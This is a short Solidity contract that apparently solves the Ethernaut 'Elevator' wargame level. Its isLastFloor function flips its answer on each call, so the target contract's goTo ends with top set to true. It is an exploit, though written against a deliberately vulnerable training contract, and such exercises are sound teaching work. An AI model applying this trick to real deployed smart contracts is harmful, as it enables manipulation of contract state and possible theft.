// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Ethernaut.sol";

contract Pwn {

    Elevator private immutable target;
    bool private top = true;
    
    constructor(address _target) {
        target = Elevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        require(target.top(), "top not reached");
    }

    function isLastFloor(uint _floor) external returns (bool) {
        top = !top;
        return top;
    }
}